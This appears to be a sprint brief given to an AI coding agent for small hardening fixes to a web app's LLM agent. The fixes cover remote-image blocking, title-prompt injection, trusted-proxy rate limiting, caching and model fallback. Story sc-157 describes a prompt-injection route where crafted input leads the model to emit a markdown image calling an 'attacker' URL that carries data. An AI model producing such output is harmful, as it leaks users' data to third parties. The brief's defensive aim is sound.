# Brief 037: small independent hardening (security singles + model fallback)

- **Feature / branch:** 037, `037-small-hardening`
- **Tier:** S, per ticket: a short plan per story (post it on the board as `notice`
  `--key plan:037-sc-NNN`, a few lines), then implement and test. No Spec Kit.
- **Seat:** `dev-2`. Worktree: `/home/rudolf/dev/wcl-worktrees/dev-b` (detached at `7989d61`).
  Create your branch from the sprint tip: `git -C /home/rudolf/dev/wcl-worktrees/dev-b
  switch -c 037-small-hardening sprint-2026-10-31b`.
- **Base ref:** `sprint-2026-10-31b` (tip `7989d61` at launch).
- **Parallel developer:** seat `dev-1` on feature 036 in `/home/rudolf/dev/wcl-worktrees/dev-a`
  (see `member.py roster` for their name). Their footprint is listed below; don't touch it.
- **Product owner:** Maren (`maren` on the board). Model opus, effort medium.
- **Migration:** none. Don't add one (036 owns 0017).
- Commit once per story (message names the sc-ID), so I can drop a single story if needed.

## Autonomy (owner preference 16, passed on to every brief)

The owner has given the whole team autonomy: "I value your initiative, your recommendations
and your learnings as an individual. I want to give you autonomy as much as possible." Within
this brief, decide, act and explain afterwards: post each real decision (design choice, an AC
interpretation, a trade-off, something you chose not to do) on the board as `decision` with
its reason. Don't ask what the steer, code, specs or a sensible default answer. Return
"blocked: ..." only for what is genuinely not yours to decide: a file outside your footprint
you can't avoid, an irreversible action, scope beyond these stories. If a story turns out to be
already fixed or not reproducible, say so on the board with the evidence, add a comment on the
ticket, and move on; that is a valid outcome. In your hand-off, include a short "Autonomy"
section: the decisions you made without asking and which you'd make differently. Write your
lesson on autonomy into your memory at the end.

## Stories (suggested order: security first)

Read each story in full first (`mcp__shortcut__stories-get-by-id`); its description is the
source. Move each to In Progress (`500000008`) when you start it and to Under Review
(`500000023`) in your hand-off. Never Done.

### sc-157 (2 pts): QA SEC-003: block remote images in model output
Remote images in model markdown can leak data through image URLs (a crafted log or web page
gets the model to emit `![](https://attacker/?q=...)`). `frontend/src/components/StreamMarkdown.tsx`
uses Streamdown defaults with no image or URL restriction.
AC: (1) model markdown can't trigger a request to a remote image host (block, or render as a
plain link/alt text; your call, post it); same-origin/data images the app itself produces
(e.g. charts), if any, still render; (2) a frontend test proves a remote `![]()` makes no
`<img src="https://...">`.

### sc-179 (2 pts): QA BUG-003/SEC-002: harden generated-title cleaning
`backend/app/services/conversation_titles.py` (`clean_title`, `_PROMPT`): a code-fenced
reply gives "", lead-ins like "Here's a title" are kept, "C#" becomes "C", bidi/control
characters aren't stripped, and answer text can steer the title.
AC: (1) fences skipped, lead-ins dropped, `#` inside words kept, Unicode Cc/Cf characters
stripped; (2) the prompt delimits the conversation text as data; (3) table-driven tests in
`backend/tests/test_conversation_titles.py` cover each case.

### sc-158 (2 pts): QA SEC-004: per-client login rate limit behind proxy
The limiters (`backend/app/auth/rate_limit.py`, used in `backend/app/api/auth.py` and
`backend/app/services/auth_service.py`) key on `request.client.host`, which is the proxy's
address behind a reverse proxy, so all clients share one bucket.
AC: (1) the client key comes from forwarded headers **only** when the direct peer is in a
configured trusted-proxy list (setting in `backend/app/config.py`, default: trust nothing, so
behaviour without config is unchanged); (2) a spoofed `X-Forwarded-For` from an untrusted peer
is ignored; (3) tests for trusted, untrusted and missing-header cases.

### sc-224 (1 pt): QA PERF-002: cache get_report_participants lookups
`wcl_agent/tools/participants.py` sends a fresh `playerDetails` request every call.
AC: (1) lookups go through the existing cache (`get_or_load`) as a `report_participants`
family with a 24 h TTL, following how other families are registered; (2) the cache-family
test (`test_cache_families.py` or equivalent) covers it.

### sc-176 (2 pts): QA PERF-001: switch to the sibling model sooner on 429s
`wcl_agent/llm/model_retry.py` (`generate_with_fallback`, `generate_with_retry`): the primary
runs its full retry schedule (5 attempts, 90 s budget) before switching to the sibling, and the
switch isn't remembered across turns.
AC: (1) when a sibling exists, the primary gets a short retry before the switch; (2) a
short-lived (minutes) memory of a 429'd model makes the next turn start on the sibling;
(3) tests with a fake model. Keep the change inside `wcl_agent/llm/` and `wcl_agent/agent.py`;
`backend/app/api/ws.py` belongs to 036. If you can't avoid ws.py, post a `question`.

### sc-184 (2 pts): QA BUG-LEAD-021: web search after a model fallback may surface raw provider errors
`wcl_agent/agent.py` (~line 441-466): the web-search sub-agent is a plain model pinned to the
turn's model with no retry, so after a fallback a 429/provider error can reach the user raw.
AC: (1) reproduce with a fake provider error in a test first (no live check needed); (2) the
web-search call uses the same retry/fallback path as the main model, or degrades to a clean
user-facing message; no raw provider error text reaches the user; (3) regression test.
If after reading the code it's already handled, post the evidence and comment on the ticket.

## File footprint (stay inside it)

`frontend/src/components/StreamMarkdown.tsx` (and its test),
`backend/app/services/conversation_titles.py`, `backend/app/auth/rate_limit.py`,
`backend/app/api/auth.py`, `backend/app/services/auth_service.py`, `backend/app/config.py`,
`wcl_agent/tools/participants.py`, `wcl_agent/cache/*`, `wcl_agent/llm/*`, `wcl_agent/agent.py`,
and tests for these under `backend/tests/`, `tests/` and `frontend/src/**/*.test.tsx`.
`.env.example` / docs for the new trusted-proxy setting are yours too.

**Not yours (dev-1, feature 036):** `backend/app/api/{ws,proposals,conversations}.py`,
`backend/app/services/{profile_context,profile_proposals,background,guide}.py`,
`backend/app/agent_tools/*`, `backend/app/db/repository.py`, `backend/app/repositories/*`,
`backend/app/schemas.py`, `wcl_agent/capabilities.py`, `frontend/src/components/ProposalCard.tsx`,
`backend/migrations/`, `documentation/architecture/*`. If you truly need one, post a `question`
on the board (`--key owner:<path>`) and continue with the rest; I arbitrate.
Never commit `CLAUDE.md`, `AGENTS.md`, `todo.md`, `.specify/memory/constitution.md` or
`.specify/feature.json`.

## Done means

- All ACs met, `uv run --extra test pytest -q` green, `cd frontend && npm run build && npm test`
  green.
- GitNexus impact before each symbol edit; `detect-changes --scope all --repo .` before each
  commit. Commits end with `Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>`.
- Never push, never merge. Hand-off as your final result: branch, commits, files, test counts,
  risks, AC mapping per story, owner live checks, and the Autonomy section.
